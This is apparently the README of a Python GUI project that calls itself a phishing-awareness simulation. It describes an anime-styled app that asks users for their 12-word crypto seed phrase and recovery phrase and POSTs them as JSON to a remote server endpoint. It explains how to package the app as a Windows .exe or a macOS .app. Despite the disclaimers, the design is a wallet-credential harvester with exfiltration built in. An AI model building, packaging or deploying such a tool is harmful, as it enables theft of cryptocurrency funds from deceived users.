
# 🐱‍💻 Meme Seed Phrase GUI (Phishing Simulation)

This is a humorous, anime-styled GUI built with Python and Tkinter for simulating phishing awareness. It mimics a meme-style app that asks users to enter their seed phrase, and reports responses to a server for training or testing purposes.

> ⚠️ **Ethical Use Only**: This tool is intended for **phishing awareness simulations** and **educational purposes**. Do not use it to collect real seed phrases or deceive users without consent.

---

## 📦 Features

- Anime-style GUI with image and playful text
- 12 seed phrase entry boxes + recovery phrase field
- Hover effect: entry boxes turn pink
- Sends data to an AWS server endpoint

---

## 🖥️ Requirements

- Python 3.8+
- `pip` (Python package manager)

### 🔧 Dependencies

Install required packages:

```bash
pip install pillow requests
```

---

## 🧑‍💻 How to Run

### 🪟 Windows

1. Clone the repo:
   ```bash
   git clone https://github.com/yourusername/meme-seed-gui.git
   cd meme-seed-gui
   ```

2. Run the script:
   ```bash
   python main.py
   ```

3. To compile into an `.exe`:
   ```bash
   pip install pyinstaller
   pyinstaller --onefile --windowed main.py
   ```

   The `.exe` will be in the `dist/` folder.

---

### 🐧 Linux

1. Clone and install dependencies:
   ```bash
   git clone https://github.com/yourusername/meme-seed-gui.git
   cd meme-seed-gui
   pip install pillow requests
   ```

2. Run the script:
   ```bash
   python3 main.py
   ```

---

### 🍎 macOS

1. Clone and install dependencies:
   ```bash
   git clone https://github.com/yourusername/meme-seed-gui.git
   cd meme-seed-gui
   pip3 install pillow requests
   ```

2. Run the script:
   ```bash
   python3 main.py
   ```

3. To create a macOS app:
   ```bash
   pip install py2app
   python3 setup.py py2app
   ```

   This will generate a `.app` bundle in the `dist/` folder.

---

## 🌐 Server Reporting

Make sure your AWS server is set up to receive `POST` requests at:

```
https://your-server-url.com/report
```

Expected JSON payload:

```json
{
  "seed_words": ["word1", "word2", ..., "extra"],
  "source": "phishing_simulation_gui"
}
```

---

## 📸 Image

Place your anime-style image in the same folder as `main.py` and name it:

```
your_image.png
```

---

## 🛡️ Disclaimer

This project is for **educational and ethical testing** only. Do not use it to collect sensitive information without informed consent.
